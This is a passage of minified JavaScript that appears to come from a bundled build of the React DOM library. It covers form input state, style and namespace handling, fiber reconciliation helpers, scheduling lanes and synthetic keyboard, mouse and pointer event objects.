function kp(t, e) {
  var n = null == e.defaultValue ? "" : e.defaultValue,
    r = null != e.checked ? e.checked : e.defaultChecked;
  (n = Zr(null != e.value ? e.value : n)),
    (t._wrapperState = {
      initialChecked: r,
      initialValue: n,
      controlled:
        "checkbox" === e.type || "radio" === e.type
          ? null != e.checked
          : null != e.value,
    });
}
function U0(t, e) {
  null != (e = e.checked) && Zf(t, "checked", e, !1);
}
function Ec(t, e) {
  U0(t, e);
  var n = Zr(e.value),
    r = e.type;
  if (null != n)
    "number" === r
      ? ((0 === n && "" === t.value) || t.value != n) && (t.value = "" + n)
      : t.value !== "" + n && (t.value = "" + n);
  else if ("submit" === r || "reset" === r)
    return void t.removeAttribute("value");
  e.hasOwnProperty("value")
    ? Pc(t, e.type, n)
    : e.hasOwnProperty("defaultValue") && Pc(t, e.type, Zr(e.defaultValue)),
    null == e.checked &&
      null != e.defaultChecked &&
      (t.defaultChecked = !!e.defaultChecked);
}
function Cp(t, e, n) {
  if (e.hasOwnProperty("value") || e.hasOwnProperty("defaultValue")) {
    var r = e.type;
    if (
      !(
        ("submit" !== r && "reset" !== r) ||
        (void 0 !== e.value && null !== e.value)
      )
    )
      return;
    (e = "" + t._wrapperState.initialValue),
      n || e === t.value || (t.value = e),
      (t.defaultValue = e);
  }
  "" !== (n = t.name) && (t.name = ""),
    (t.defaultChecked = !!t._wrapperState.initialChecked),
    "" !== n && (t.name = n);
}
function Pc(t, e, n) {
  ("number" !== e || wu(t.ownerDocument) !== t) &&
    (null == n
      ? (t.defaultValue = "" + t._wrapperState.initialValue)
      : t.defaultValue !== "" + n && (t.defaultValue = "" + n));
}
var ds = Array.isArray;
function go(t, e, n, r) {
  if (((t = t.options), e)) {
    e = {};
    for (var i = 0; i < n.length; i++) e["$" + n[i]] = !0;
    for (n = 0; n < t.length; n++)
      (i = e.hasOwnProperty("$" + t[n].value)),
        t[n].selected !== i && (t[n].selected = i),
        i && r && (t[n].defaultSelected = !0);
  } else {
    for (n = "" + Zr(n), e = null, i = 0; i < t.length; i++) {
      if (t[i].value === n)
        return (t[i].selected = !0), void (r && (t[i].defaultSelected = !0));
      null !== e || t[i].disabled || (e = t[i]);
    }
    null !== e && (e.selected = !0);
  }
}
function Nc(t, e) {
  if (null != e.dangerouslySetInnerHTML) throw Error(R(91));
  return Ce({}, e, {
    value: void 0,
    defaultValue: void 0,
    children: "" + t._wrapperState.initialValue,
  });
}
function Tp(t, e) {
  var n = e.value;
  if (null == n) {
    if (((n = e.children), (e = e.defaultValue), null != n)) {
      if (null != e) throw Error(R(92));
      if (ds(n)) {
        if (1 < n.length) throw Error(R(93));
        n = n[0];
      }
      e = n;
    }
    null == e && (e = ""), (n = e);
  }
  t._wrapperState = { initialValue: Zr(n) };
}
function B0(t, e) {
  var n = Zr(e.value),
    r = Zr(e.defaultValue);
  null != n &&
    ((n = "" + n) !== t.value && (t.value = n),
    null == e.defaultValue && t.defaultValue !== n && (t.defaultValue = n)),
    null != r && (t.defaultValue = "" + r);
}
function Ep(t) {
  var e = t.textContent;
  e === t._wrapperState.initialValue && "" !== e && null !== e && (t.value = e);
}
function V0(t) {
  switch (t) {
    case "svg":
      return "http://www.w3.org/2000/svg";
    case "math":
      return "http://www.w3.org/1998/Math/MathML";
    default:
      return "http://www.w3.org/1999/xhtml";
  }
}
function Mc(t, e) {
  return null == t || "http://www.w3.org/1999/xhtml" === t
    ? V0(e)
    : "http://www.w3.org/2000/svg" === t && "foreignObject" === e
    ? "http://www.w3.org/1999/xhtml"
    : t;
}
var kl,
  H0 = (function (t) {
    return typeof MSApp < "u" && MSApp.execUnsafeLocalFunction
      ? function (e, n, r, i) {
          MSApp.execUnsafeLocalFunction(function () {
            return t(e, n);
          });
        }
      : t;
  })(function (t, e) {
    if ("http://www.w3.org/2000/svg" !== t.namespaceURI || "innerHTML" in t)
      t.innerHTML = e;
    else {
      for (
        (kl = kl || document.createElement("div")).innerHTML =
          "<svg>" + e.valueOf().toString() + "</svg>",
          e = kl.firstChild;
        t.firstChild;

      )
        t.removeChild(t.firstChild);
      for (; e.firstChild; ) t.appendChild(e.firstChild);
    }
  });
function bs(t, e) {
  if (e) {
    var n = t.firstChild;
    if (n && n === t.lastChild && 3 === n.nodeType)
      return void (n.nodeValue = e);
  }
  t.textContent = e;
}
var ws = {
    animationIterationCount: !0,
    aspectRatio: !0,
    borderImageOutset: !0,
    borderImageSlice: !0,
    borderImageWidth: !0,
    boxFlex: !0,
    boxFlexGroup: !0,
    boxOrdinalGroup: !0,
    columnCount: !0,
    columns: !0,
    flex: !0,
    flexGrow: !0,
    flexPositive: !0,
    flexShrink: !0,
    flexNegative: !0,
    flexOrder: !0,
    gridArea: !0,
    gridRow: !0,
    gridRowEnd: !0,
    gridRowSpan: !0,
    gridRowStart: !0,
    gridColumn: !0,
    gridColumnEnd: !0,
    gridColumnSpan: !0,
    gridColumnStart: !0,
    fontWeight: !0,
    lineClamp: !0,
    lineHeight: !0,
    opacity: !0,
    order: !0,
    orphans: !0,
    tabSize: !0,
    widows: !0,
    zIndex: !0,
    zoom: !0,
    fillOpacity: !0,
    floodOpacity: !0,
    stopOpacity: !0,
    strokeDasharray: !0,
    strokeDashoffset: !0,
    strokeMiterlimit: !0,
    strokeOpacity: !0,
    strokeWidth: !0,
  },
  G_ = ["Webkit", "ms", "Moz", "O"];
function b0(t, e, n) {
  return null == e || "boolean" == typeof e || "" === e
    ? ""
    : n || "number" != typeof e || 0 === e || (ws.hasOwnProperty(t) && ws[t])
    ? ("" + e).trim()
    : e + "px";
}
function $0(t, e) {
  for (var n in ((t = t.style), e))
    if (e.hasOwnProperty(n)) {
      var r = 0 === n.indexOf("--"),
        i = b0(n, e[n], r);
      "float" === n && (n = "cssFloat"), r ? t.setProperty(n, i) : (t[n] = i);
    }
}
Object.keys(ws).forEach(function (t) {
  G_.forEach(function (e) {
    (e = e + t.charAt(0).toUpperCase() + t.substring(1)), (ws[e] = ws[t]);
  });
});
var K_ = Ce(
  { menuitem: !0 },
  {
    area: !0,
    base: !0,
    br: !0,
    col: !0,
    embed: !0,
    hr: !0,
    img: !0,
    input: !0,
    keygen: !0,
    link: !0,
    meta: !0,
    param: !0,
    source: !0,
    track: !0,
    wbr: !0,
  }
);
function Oc(t, e) {
  if (e) {
    if (K_[t] && (null != e.children || null != e.dangerouslySetInnerHTML))
      throw Error(R(137, t));
    if (null != e.dangerouslySetInnerHTML) {
      if (null != e.children) throw Error(R(60));
      if (
        "object" != typeof e.dangerouslySetInnerHTML ||
        !("__html" in e.dangerouslySetInnerHTML)
      )
        throw Error(R(61));
    }
    if (null != e.style && "object" != typeof e.style) throw Error(R(62));
  }
}
function Rc(t, e) {
  if (-1 === t.indexOf("-")) return "string" == typeof e.is;
  switch (t) {
    case "annotation-xml":
    case "color-profile":
    case "font-face":
    case "font-face-src":
    case "font-face-uri":
    case "font-face-format":
    case "font-face-name":
    case "missing-glyph":
      return !1;
    default:
      return !0;
  }
}
var Dc = null;
function nd(t) {
  return (
    (t = t.target || t.srcElement || window).correspondingUseElement &&
      (t = t.correspondingUseElement),
    3 === t.nodeType ? t.parentNode : t
  );
}
var Lc = null,
  _o = null,
  vo = null;
function Pp(t) {
  if ((t = _l(t))) {
    if ("function" != typeof Lc) throw Error(R(280));
    var e = t.stateNode;
    e && ((e = ca(e)), Lc(t.stateNode, t.type, e));
  }
}
function W0(t) {
  _o ? (vo ? vo.push(t) : (vo = [t])) : (_o = t);
}
function Y0() {
  if (_o) {
    var t = _o,
      e = vo;
    if (((vo = _o = null), Pp(t), e)) for (t = 0; t < e.length; t++) Pp(e[t]);
  }
}
function X0(t, e) {
  return t(e);
}
function Q0() {}
var La = !1;
function G0(t, e, n) {
  if (La) return t(e, n);
  La = !0;
  try {
    return X0(t, e, n);
  } finally {
    (La = !1), (null !== _o || null !== vo) && (Q0(), Y0());
  }
}
function $s(t, e) {
  var n = t.stateNode;
  if (null === n) return null;
  var r = ca(n);
  if (null === r) return null;
  n = r[e];
  e: switch (e) {
    case "onClick":
    case "onClickCapture":
    case "onDoubleClick":
    case "onDoubleClickCapture":
    case "onMouseDown":
    case "onMouseDownCapture":
    case "onMouseMove":
    case "onMouseMoveCapture":
    case "onMouseUp":
    case "onMouseUpCapture":
    case "onMouseEnter":
      (r = !r.disabled) ||
        (r = !(
          "button" === (t = t.type) ||
          "input" === t ||
          "select" === t ||
          "textarea" === t
        )),
        (t = !r);
      break e;
    default:
      t = !1;
  }
  if (t) return null;
  if (n && "function" != typeof n) throw Error(R(231, e, typeof n));
  return n;
}
var zc = !1;
if (gr)
  try {
    var Jo = {};
    Object.defineProperty(Jo, "passive", {
      get: function () {
        zc = !0;
      },
    }),
      window.addEventListener("test", Jo, Jo),
      window.removeEventListener("test", Jo, Jo);
  } catch {
    zc = !1;
  }
function q_(t, e, n, r, i, o, s, l, u) {
  var a = Array.prototype.slice.call(arguments, 3);
  try {
    e.apply(n, a);
  } catch (c) {
    this.onError(c);
  }
}
var Ss = !1,
  Su = null,
  ku = !1,
  jc = null,
  Z_ = {
    onError: function (t) {
      (Ss = !0), (Su = t);
    },
  };
function J_(t, e, n, r, i, o, s, l, u) {
  (Ss = !1), (Su = null), q_.apply(Z_, arguments);
}
function ev(t, e, n, r, i, o, s, l, u) {
  if ((J_.apply(this, arguments), Ss)) {
    if (!Ss) throw Error(R(198));
    var a = Su;
    (Ss = !1), (Su = null), ku || ((ku = !0), (jc = a));
  }
}
function Vi(t) {
  var e = t,
    n = t;
  if (t.alternate) for (; e.return; ) e = e.return;
  else {
    t = e;
    do {
      4098 & (e = t).flags && (n = e.return), (t = e.return);
    } while (t);
  }
  return 3 === e.tag ? n : null;
}
function K0(t) {
  if (13 === t.tag) {
    var e = t.memoizedState;
    if (
      (null === e && null !== (t = t.alternate) && (e = t.memoizedState),
      null !== e)
    )
      return e.dehydrated;
  }
  return null;
}
function Np(t) {
  if (Vi(t) !== t) throw Error(R(188));
}
function tv(t) {
  var e = t.alternate;
  if (!e) {
    if (null === (e = Vi(t))) throw Error(R(188));
    return e !== t ? null : t;
  }
  for (var n = t, r = e; ; ) {
    var i = n.return;
    if (null === i) break;
    var o = i.alternate;
    if (null === o) {
      if (null !== (r = i.return)) {
        n = r;
        continue;
      }
      break;
    }
    if (i.child === o.child) {
      for (o = i.child; o; ) {
        if (o === n) return Np(i), t;
        if (o === r) return Np(i), e;
        o = o.sibling;
      }
      throw Error(R(188));
    }
    if (n.return !== r.return) (n = i), (r = o);
    else {
      for (var s = !1, l = i.child; l; ) {
        if (l === n) {
          (s = !0), (n = i), (r = o);
          break;
        }
        if (l === r) {
          (s = !0), (r = i), (n = o);
          break;
        }
        l = l.sibling;
      }
      if (!s) {
        for (l = o.child; l; ) {
          if (l === n) {
            (s = !0), (n = o), (r = i);
            break;
          }
          if (l === r) {
            (s = !0), (r = o), (n = i);
            break;
          }
          l = l.sibling;
        }
        if (!s) throw Error(R(189));
      }
    }
    if (n.alternate !== r) throw Error(R(190));
  }
  if (3 !== n.tag) throw Error(R(188));
  return n.stateNode.current === n ? t : e;
}
function q0(t) {
  return null !== (t = tv(t)) ? Z0(t) : null;
}
function Z0(t) {
  if (5 === t.tag || 6 === t.tag) return t;
  for (t = t.child; null !== t; ) {
    var e = Z0(t);
    if (null !== e) return e;
    t = t.sibling;
  }
  return null;
}
var J0 = sn.unstable_scheduleCallback,
  Mp = sn.unstable_cancelCallback,
  nv = sn.unstable_shouldYield,
  rv = sn.unstable_requestPaint,
  Le = sn.unstable_now,
  iv = sn.unstable_getCurrentPriorityLevel,
  rd = sn.unstable_ImmediatePriority,
  em = sn.unstable_UserBlockingPriority,
  Cu = sn.unstable_NormalPriority,
  ov = sn.unstable_LowPriority,
  tm = sn.unstable_IdlePriority,
  sa = null,
  qn = null;
function sv(t) {
  if (qn && "function" == typeof qn.onCommitFiberRoot)
    try {
      qn.onCommitFiberRoot(sa, t, void 0, 128 == (128 & t.current.flags));
    } catch {}
}
var An = Math.clz32 ? Math.clz32 : av,
  lv = Math.log,
  uv = Math.LN2;
function av(t) {
  return 0 === (t >>>= 0) ? 32 : (31 - ((lv(t) / uv) | 0)) | 0;
}
var Cl = 64,
  Tl = 4194304;
function ps(t) {
  switch (t & -t) {
    case 1:
      return 1;
    case 2:
      return 2;
    case 4:
      return 4;
    case 8:
      return 8;
    case 16:
      return 16;
    case 32:
      return 32;
    case 64:
    case 128:
    case 256:
    case 512:
    case 1024:
    case 2048:
    case 4096:
    case 8192:
    case 16384:
    case 32768:
    case 65536:
    case 131072:
    case 262144:
    case 524288:
    case 1048576:
    case 2097152:
      return 4194240 & t;
    case 4194304:
    case 8388608:
    case 16777216:
    case 33554432:
    case 67108864:
      return 130023424 & t;
    case 134217728:
      return 134217728;
    case 268435456:
      return 268435456;
    case 536870912:
      return 536870912;
    case 1073741824:
      return 1073741824;
    default:
      return t;
  }
}
function Tu(t, e) {
  var n = t.pendingLanes;
  if (0 === n) return 0;
  var r = 0,
    i = t.suspendedLanes,
    o = t.pingedLanes,
    s = 268435455 & n;
  if (0 !== s) {
    var l = s & ~i;
    0 !== l ? (r = ps(l)) : 0 !== (o &= s) && (r = ps(o));
  } else 0 !== (s = n & ~i) ? (r = ps(s)) : 0 !== o && (r = ps(o));
  if (0 === r) return 0;
  if (
    0 !== e &&
    e !== r &&
    !(e & i) &&
    ((i = r & -r) >= (o = e & -e) || (16 === i && 0 != (4194240 & o)))
  )
    return e;
  if ((4 & r && (r |= 16 & n), 0 !== (e = t.entangledLanes)))
    for (t = t.entanglements, e &= r; 0 < e; )
      (i = 1 << (n = 31 - An(e))), (r |= t[n]), (e &= ~i);
  return r;
}
function cv(t, e) {
  switch (t) {
    case 1:
    case 2:
    case 4:
      return e + 250;
    case 8:
    case 16:
    case 32:
    case 64:
    case 128:
    case 256:
    case 512:
    case 1024:
    case 2048:
    case 4096:
    case 8192:
    case 16384:
    case 32768:
    case 65536:
    case 131072:
    case 262144:
    case 524288:
    case 1048576:
    case 2097152:
      return e + 5e3;
    default:
      return -1;
  }
}
function fv(t, e) {
  for (
    var n = t.suspendedLanes,
      r = t.pingedLanes,
      i = t.expirationTimes,
      o = t.pendingLanes;
    0 < o;

  ) {
    var s = 31 - An(o),
      l = 1 << s,
      u = i[s];
    -1 === u
      ? (!(l & n) || l & r) && (i[s] = cv(l, e))
      : u <= e && (t.expiredLanes |= l),
      (o &= ~l);
  }
}
function Ic(t) {
  return 0 !== (t = -1073741825 & t.pendingLanes)
    ? t
    : 1073741824 & t
    ? 1073741824
    : 0;
}
function nm() {
  var t = Cl;
  return !(4194240 & (Cl <<= 1)) && (Cl = 64), t;
}
function za(t) {
  for (var e = [], n = 0; 31 > n; n++) e.push(t);
  return e;
}
function ml(t, e, n) {
  (t.pendingLanes |= e),
    536870912 !== e && ((t.suspendedLanes = 0), (t.pingedLanes = 0)),
    ((t = t.eventTimes)[(e = 31 - An(e))] = n);
}
function dv(t, e) {
  var n = t.pendingLanes & ~e;
  (t.pendingLanes = e),
    (t.suspendedLanes = 0),
    (t.pingedLanes = 0),
    (t.expiredLanes &= e),
    (t.mutableReadLanes &= e),
    (t.entangledLanes &= e),
    (e = t.entanglements);
  var r = t.eventTimes;
  for (t = t.expirationTimes; 0 < n; ) {
    var i = 31 - An(n),
      o = 1 << i;
    (e[i] = 0), (r[i] = -1), (t[i] = -1), (n &= ~o);
  }
}
function id(t, e) {
  var n = (t.entangledLanes |= e);
  for (t = t.entanglements; n; ) {
    var r = 31 - An(n),
      i = 1 << r;
    (i & e) | (t[r] & e) && (t[r] |= e), (n &= ~i);
  }
}
var ae = 0;
function rm(t) {
  return 1 < (t &= -t) ? (4 < t ? (268435455 & t ? 16 : 536870912) : 4) : 1;
}
var im,
  od,
  om,
  sm,
  lm,
  Ac = !1,
  El = [],
  Vr = null,
  Hr = null,
  br = null,
  Ws = new Map(),
  Ys = new Map(),
  Rr = [],
  pv =
    "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(
      " "
    );
function Op(t, e) {
  switch (t) {
    case "focusin":
    case "focusout":
      Vr = null;
      break;
    case "dragenter":
    case "dragleave":
      Hr = null;
      break;
    case "mouseover":
    case "mouseout":
      br = null;
      break;
    case "pointerover":
    case "pointerout":
      Ws.delete(e.pointerId);
      break;
    case "gotpointercapture":
    case "lostpointercapture":
      Ys.delete(e.pointerId);
  }
}
function es(t, e, n, r, i, o) {
  return null === t || t.nativeEvent !== o
    ? ((t = {
        blockedOn: e,
        domEventName: n,
        eventSystemFlags: r,
        nativeEvent: o,
        targetContainers: [i],
      }),
      null !== e && null !== (e = _l(e)) && od(e),
      t)
    : ((t.eventSystemFlags |= r),
      (e = t.targetContainers),
      null !== i && -1 === e.indexOf(i) && e.push(i),
      t);
}
function hv(t, e, n, r, i) {
  switch (e) {
    case "focusin":
      return (Vr = es(Vr, t, e, n, r, i)), !0;
    case "dragenter":
      return (Hr = es(Hr, t, e, n, r, i)), !0;
    case "mouseover":
      return (br = es(br, t, e, n, r, i)), !0;
    case "pointerover":
      var o = i.pointerId;
      return Ws.set(o, es(Ws.get(o) || null, t, e, n, r, i)), !0;
    case "gotpointercapture":
      return (
        (o = i.pointerId), Ys.set(o, es(Ys.get(o) || null, t, e, n, r, i)), !0
      );
  }
  return !1;
}
function um(t) {
  var e = _i(t.target);
  if (null !== e) {
    var n = Vi(e);
    if (null !== n)
      if (13 === (e = n.tag)) {
        if (null !== (e = K0(n)))
          return (
            (t.blockedOn = e),
            void lm(t.priority, function () {
              om(n);
            })
          );
      } else if (3 === e && n.stateNode.current.memoizedState.isDehydrated)
        return void (t.blockedOn =
          3 === n.tag ? n.stateNode.containerInfo : null);
  }
  t.blockedOn = null;
}
function Jl(t) {
  if (null !== t.blockedOn) return !1;
  for (var e = t.targetContainers; 0 < e.length; ) {
    var n = Fc(t.domEventName, t.eventSystemFlags, e[0], t.nativeEvent);
    if (null !== n) return null !== (e = _l(n)) && od(e), (t.blockedOn = n), !1;
    var r = new (n = t.nativeEvent).constructor(n.type, n);
    (Dc = r), n.target.dispatchEvent(r), (Dc = null), e.shift();
  }
  return !0;
}
function Rp(t, e, n) {
  Jl(t) && n.delete(e);
}
function mv() {
  (Ac = !1),
    null !== Vr && Jl(Vr) && (Vr = null),
    null !== Hr && Jl(Hr) && (Hr = null),
    null !== br && Jl(br) && (br = null),
    Ws.forEach(Rp),
    Ys.forEach(Rp);
}
function ts(t, e) {
  t.blockedOn === e &&
    ((t.blockedOn = null),
    Ac ||
      ((Ac = !0),
      sn.unstable_scheduleCallback(sn.unstable_NormalPriority, mv)));
}
function Xs(t) {
  function e(i) {
    return ts(i, t);
  }
  if (0 < El.length) {
    ts(El[0], t);
    for (var n = 1; n < El.length; n++) {
      var r = El[n];
      r.blockedOn === t && (r.blockedOn = null);
    }
  }
  for (
    null !== Vr && ts(Vr, t),
      null !== Hr && ts(Hr, t),
      null !== br && ts(br, t),
      Ws.forEach(e),
      Ys.forEach(e),
      n = 0;
    n < Rr.length;
    n++
  )
    (r = Rr[n]).blockedOn === t && (r.blockedOn = null);
  for (; 0 < Rr.length && null === (n = Rr[0]).blockedOn; )
    um(n), null === n.blockedOn && Rr.shift();
}
var yo = Sr.ReactCurrentBatchConfig,
  Eu = !0;
function gv(t, e, n, r) {
  var i = ae,
    o = yo.transition;
  yo.transition = null;
  try {
    (ae = 1), sd(t, e, n, r);
  } finally {
    (ae = i), (yo.transition = o);
  }
}
function _v(t, e, n, r) {
  var i = ae,
    o = yo.transition;
  yo.transition = null;
  try {
    (ae = 4), sd(t, e, n, r);
  } finally {
    (ae = i), (yo.transition = o);
  }
}
function sd(t, e, n, r) {
  if (Eu) {
    var i = Fc(t, e, n, r);
    if (null === i) $a(t, e, r, Pu, n), Op(t, r);
    else if (hv(i, t, e, n, r)) r.stopPropagation();
    else if ((Op(t, r), 4 & e && -1 < pv.indexOf(t))) {
      for (; null !== i; ) {
        var o = _l(i);
        if (
          (null !== o && im(o),
          null === (o = Fc(t, e, n, r)) && $a(t, e, r, Pu, n),
          o === i)
        )
          break;
        i = o;
      }
      null !== i && r.stopPropagation();
    } else $a(t, e, r, null, n);
  }
}
var Pu = null;
function Fc(t, e, n, r) {
  if (((Pu = null), null !== (t = _i((t = nd(r))))))
    if (null === (e = Vi(t))) t = null;
    else if (13 === (n = e.tag)) {
      if (null !== (t = K0(e))) return t;
      t = null;
    } else if (3 === n) {
      if (e.stateNode.current.memoizedState.isDehydrated)
        return 3 === e.tag ? e.stateNode.containerInfo : null;
      t = null;
    } else e !== t && (t = null);
  return (Pu = t), null;
}
function am(t) {
  switch (t) {
    case "cancel":
    case "click":
    case "close":
    case "contextmenu":
    case "copy":
    case "cut":
    case "auxclick":
    case "dblclick":
    case "dragend":
    case "dragstart":
    case "drop":
    case "focusin":
    case "focusout":
    case "input":
    case "invalid":
    case "keydown":
    case "keypress":
    case "keyup":
    case "mousedown":
    case "mouseup":
    case "paste":
    case "pause":
    case "play":
    case "pointercancel":
    case "pointerdown":
    case "pointerup":
    case "ratechange":
    case "reset":
    case "resize":
    case "seeked":
    case "submit":
    case "touchcancel":
    case "touchend":
    case "touchstart":
    case "volumechange":
    case "change":
    case "selectionchange":
    case "textInput":
    case "compositionstart":
    case "compositionend":
    case "compositionupdate":
    case "beforeblur":
    case "afterblur":
    case "beforeinput":
    case "blur":
    case "fullscreenchange":
    case "focus":
    case "hashchange":
    case "popstate":
    case "select":
    case "selectstart":
      return 1;
    case "drag":
    case "dragenter":
    case "dragexit":
    case "dragleave":
    case "dragover":
    case "mousemove":
    case "mouseout":
    case "mouseover":
    case "pointermove":
    case "pointerout":
    case "pointerover":
    case "scroll":
    case "toggle":
    case "touchmove":
    case "wheel":
    case "mouseenter":
    case "mouseleave":
    case "pointerenter":
    case "pointerleave":
      return 4;
    case "message":
      switch (iv()) {
        case rd:
          return 1;
        case em:
          return 4;
        case Cu:
        case ov:
          return 16;
        case tm:
          return 536870912;
        default:
          return 16;
      }
    default:
      return 16;
  }
}
var Lr = null,
  ld = null,
  eu = null;
function cm() {
  if (eu) return eu;
  var t,
    r,
    e = ld,
    n = e.length,
    i = "value" in Lr ? Lr.value : Lr.textContent,
    o = i.length;
  for (t = 0; t < n && e[t] === i[t]; t++);
  var s = n - t;
  for (r = 1; r <= s && e[n - r] === i[o - r]; r++);
  return (eu = i.slice(t, 1 < r ? 1 - r : void 0));
}
function tu(t) {
  var e = t.keyCode;
  return (
    "charCode" in t ? 0 === (t = t.charCode) && 13 === e && (t = 13) : (t = e),
    10 === t && (t = 13),
    32 <= t || 13 === t ? t : 0
  );
}
function Pl() {
  return !0;
}
function Dp() {
  return !1;
}
function an(t) {
  function e(n, r, i, o, s) {
    for (var l in ((this._reactName = n),
    (this._targetInst = i),
    (this.type = r),
    (this.nativeEvent = o),
    (this.target = s),
    (this.currentTarget = null),
    t))
      t.hasOwnProperty(l) && ((n = t[l]), (this[l] = n ? n(o) : o[l]));
    return (
      (this.isDefaultPrevented = (
        null != o.defaultPrevented ? o.defaultPrevented : !1 === o.returnValue
      )
        ? Pl
        : Dp),
      (this.isPropagationStopped = Dp),
      this
    );
  }
  return (
    Ce(e.prototype, {
      preventDefault: function () {
        this.defaultPrevented = !0;
        var n = this.nativeEvent;
        n &&
          (n.preventDefault
            ? n.preventDefault()
            : "unknown" != typeof n.returnValue && (n.returnValue = !1),
          (this.isDefaultPrevented = Pl));
      },
      stopPropagation: function () {
        var n = this.nativeEvent;
        n &&
          (n.stopPropagation
            ? n.stopPropagation()
            : "unknown" != typeof n.cancelBubble && (n.cancelBubble = !0),
          (this.isPropagationStopped = Pl));
      },
      persist: function () {},
      isPersistent: Pl,
    }),
    e
  );
}
var ja,
  Ia,
  ns,
  bo = {
    eventPhase: 0,
    bubbles: 0,
    cancelable: 0,
    timeStamp: function (t) {
      return t.timeStamp || Date.now();
    },
    defaultPrevented: 0,
    isTrusted: 0,
  },
  ud = an(bo),
  gl = Ce({}, bo, { view: 0, detail: 0 }),
  vv = an(gl),
  la = Ce({}, gl, {
    screenX: 0,
    screenY: 0,
    clientX: 0,
    clientY: 0,
    pageX: 0,
    pageY: 0,
    ctrlKey: 0,
    shiftKey: 0,
    altKey: 0,
    metaKey: 0,
    getModifierState: ad,
    button: 0,
    buttons: 0,
    relatedTarget: function (t) {
      return void 0 === t.relatedTarget
        ? t.fromElement === t.srcElement
          ? t.toElement
          : t.fromElement
        : t.relatedTarget;
    },
    movementX: function (t) {
      return "movementX" in t
        ? t.movementX
        : (t !== ns &&
            (ns && "mousemove" === t.type
              ? ((ja = t.screenX - ns.screenX), (Ia = t.screenY - ns.screenY))
              : (Ia = ja = 0),
            (ns = t)),
          ja);
    },
    movementY: function (t) {
      return "movementY" in t ? t.movementY : Ia;
    },
  }),
  Lp = an(la),
  yv = Ce({}, la, { dataTransfer: 0 }),
  xv = an(yv),
  wv = Ce({}, gl, { relatedTarget: 0 }),
  Aa = an(wv),
  Sv = Ce({}, bo, { animationName: 0, elapsedTime: 0, pseudoElement: 0 }),
  kv = an(Sv),
  Cv = Ce({}, bo, {
    clipboardData: function (t) {
      return "clipboardData" in t ? t.clipboardData : window.clipboardData;
    },
  }),
  Tv = an(Cv),
  Ev = Ce({}, bo, { data: 0 }),
  zp = an(Ev),
  Pv = {
    Esc: "Escape",
    Spacebar: " ",
    Left: "ArrowLeft",
    Up: "ArrowUp",
    Right: "ArrowRight",
    Down: "ArrowDown",
    Del: "Delete",
    Win: "OS",
    Menu: "ContextMenu",
    Apps: "ContextMenu",
    Scroll: "ScrollLock",
    MozPrintableKey: "Unidentified",
  },
  Nv = {
    8: "Backspace",
    9: "Tab",
    12: "Clear",
    13: "Enter",
    16: "Shift",
    17: "Control",
    18: "Alt",
    19: "Pause",
    20: "CapsLock",
    27: "Escape",
    32: " ",
    33: "PageUp",
    34: "PageDown",
    35: "End",
    36: "Home",
    37: "ArrowLeft",
    38: "ArrowUp",
    39: "ArrowRight",
    40: "ArrowDown",
    45: "Insert",
    46: "Delete",
    112: "F1",
    113: "F2",
    114: "F3",
    115: "F4",
    116: "F5",
    117: "F6",
    118: "F7",
    119: "F8",
    120: "F9",
    121: "F10",
    122: "F11",
    123: "F12",
    144: "NumLock",
    145: "ScrollLock",
    224: "Meta",
  },
  Mv = {
    Alt: "altKey",
    Control: "ctrlKey",
    Meta: "metaKey",
    Shift: "shiftKey",
  };
function Ov(t) {
  var e = this.nativeEvent;
  return e.getModifierState ? e.getModifierState(t) : !!(t = Mv[t]) && !!e[t];
}
function ad() {
  return Ov;
}
var Rv = Ce({}, gl, {
    key: function (t) {
      if (t.key) {
        var e = Pv[t.key] || t.key;
        if ("Unidentified" !== e) return e;
      }
      return "keypress" === t.type
        ? 13 === (t = tu(t))
          ? "Enter"
          : String.fromCharCode(t)
        : "keydown" === t.type || "keyup" === t.type
        ? Nv[t.keyCode] || "Unidentified"
        : "";
    },
    code: 0,
    location: 0,
    ctrlKey: 0,
    shiftKey: 0,
    altKey: 0,
    metaKey: 0,
    repeat: 0,
    locale: 0,
    getModifierState: ad,
    charCode: function (t) {
      return "keypress" === t.type ? tu(t) : 0;
    },
    keyCode: function (t) {
      return "keydown" === t.type || "keyup" === t.type ? t.keyCode : 0;
    },
    which: function (t) {
      return "keypress" === t.type
        ? tu(t)
        : "keydown" === t.type || "keyup" === t.type
        ? t.keyCode
        : 0;
    },
  }),
  Dv = an(Rv),
  Lv = Ce({}, la, {
    pointerId: 0,
    width: 0,
    height: 0,
    pressure: 0,
    tangentialPressure: 0,
    tiltX: 0,
    tiltY: 0,
    twist: 0,
    pointerType: 0,
    isPrimary: 0,
  }),
  jp = an(Lv),
  zv = Ce({}, gl, {
    touches: 0,
    targetTouches: 0,
    changedTouches: 0,
    altKey: 0,
    metaKey: 0,
    ctrlKey: 0,
    shiftKey: 0,
    getModifierState: ad,
  }),
  jv = an(zv),
  Iv = Ce({}, bo, { propertyName: 0, elapsedTime: 0, pseudoElement: 0 }),
  Av = an(Iv),
  Fv = Ce({}, la, {
    deltaX: function (t) {
      return "deltaX" in t ? t.deltaX : "wheelDeltaX" in t ? -t.wheelDeltaX : 0;
    },
    deltaY: function (t) {
      return "deltaY" in t
        ? t.deltaY
        : "wheelDeltaY" in t
        ? -t.wheelDeltaY
        : "wheelDelta" in t
        ? -t.wheelDelta
        : 0;
    },
    deltaZ: 0,
    deltaMode: 0,
  }),
  Uv = an(Fv),
  Bv = [9, 13, 27, 32],
  cd = gr && "CompositionEvent" in window,
  ks = null;
gr && "documentMode" in document && (ks = document.documentMode);
var Vv = gr && "TextEvent" in window && !ks,
  fm = gr && (!cd || (ks && 8 < ks && 11 >= ks)),
  Ip = String.fromCharCode(32),
  Ap = !1;
function dm(t, e) {
  switch (t) {
    case "keyup":
      return -1 !== Bv.indexOf(e.keyCode);
    case "keydown":
      return 229 !== e.keyCode;
    case "keypress":
    case "mousedown":
    case "focusout":
      return !0;
    default:
      return !1;
  }
}
function pm(t) {
  return "object" == typeof (t = t.detail) && "data" in t ? t.data : null;
}
var to = !1;
function Hv(t, e) {
  switch (t) {
    case "compositionend":
      return pm(e);
    case "keypress":
      return 32 !== e.which ? null : ((Ap = !0), Ip);
    case "textInput":
      return (t = e.data) === Ip && Ap ? null : t;
    default:
      return null;
  }
}
function bv(t, e) {
  if (to)
    return "compositionend" === t || (!cd && dm(t, e))
      ? ((t = cm()), (eu = ld = Lr = null), (to = !1), t)
      : null;
  switch (t) {
    case "paste":
    default:
      return null;
    case "keypress":
